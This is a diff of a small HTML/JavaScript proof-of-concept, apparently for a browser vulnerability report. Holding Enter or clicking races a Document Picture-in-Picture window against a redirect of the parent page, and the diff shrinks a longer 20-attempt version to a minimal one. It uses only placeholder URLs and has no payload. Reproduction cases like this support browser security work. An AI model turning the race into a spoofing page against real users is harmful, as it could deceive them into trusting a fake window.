@@ -1,98 +1,24 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ultra-Fast PiP Race</title>
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-  h1 { color: #4285f4; margin-bottom: 20px; }
-  p { color: #666; font-size: 14px; margin-bottom: 20px; }
-  #status { font-family: monospace; font-size: 12px; color: #999; margin-top: 20px; }
-</style>
-</head>
-<body>
-
-<h1>Hold Enter (Ultra Race)</h1>
-<p>Press and hold Enter to trigger PiP + Redirect race (0ms).</p>
-<div id="status">[*] Ready...</div>
+<h1>Hold Enter</h1>
 
 <script>
-(function () {
-  'use strict';
+    let i = 0;
+    const pipOpen = async () => {
+        if (i > 5) return;
+        i++;
 
-  var statusEl = document.getElementById('status');
-  var counter = 0;
-  var maxAttempts = 20;
+        documentPictureInPicture.requestWindow({
+            width: 600,
+            height: 400,
+        }).then(pipWindow => {
+            pipWindow.location.href = 'https://example.com';
+        });
 
-  function log(msg) {
-    statusEl.textContent = msg;
-    console.log("[Ultra PiP Race] " + msg);
-  }
+        setTimeout(() => {
+            location.href = 'https://google.com/x';
+        }, 100);
+    };
 
-  // ============================================
-  // 1. FUNGSI UTAMA: PiP + REDIRECT RACE (0ms)
-  // ============================================
-  async function triggerRace() {
-    if (counter >= maxAttempts) {
-      log("[!] Max attempts reached: " + counter);
-      return;
-    }
-    counter++;
-    log("[*] Attempt #" + counter);
-
-    // ============================================
-    // A. BUKA PiP (ASYNC)
-    // ============================================
-    const pipPromise = documentPictureInPicture.requestWindow({
-      width: 600,
-      height: 400
-    }).then(pipWindow => {
-      // Navigasi PiP ke example.com (setelah PiP siap)
-      pipWindow.location.href = 'https://example.com';
-      return pipWindow;
-    }).catch(err => {
-      log("PiP Error: " + err.message);
-      return null;
-    });
-
-    // ============================================
-    // B. REDIRECT PARENT (LANGSUNG, 0ms)
-    // ============================================
-    // Tidak ada setTimeout. Langsung eksekusi.
-    try {
-      window.location.href = 'https://google.com/x';
-    } catch (e) {}
-
-    // ============================================
-    // C. TUNGGU PiP (OPSIONAL)
-    // ============================================
-    pipPromise.then(pipWindow => {
-      if (pipWindow) {
-        log("[+] PiP opened and navigated to example.com");
-      }
-    });
-  }
-
-  // ============================================
-  // 2. KEYPRESS LISTENER (HOLD ENTER)
-  // ============================================
-  document.body.onkeypress = function(e) {
-    if (e.key === 'Enter') {
-      triggerRace();
-    }
-  };
-
-  // ============================================
-  // 3. CLICK LISTENER (OPSIONAL)
-  // ============================================
-  document.body.addEventListener('click', function() {
-    triggerRace();
-  }, { once: false });
-
-})();
+    document.body.onkeypress = () => {
+        pipOpen();
+    };
 </script>
-
-</body>
-</html>
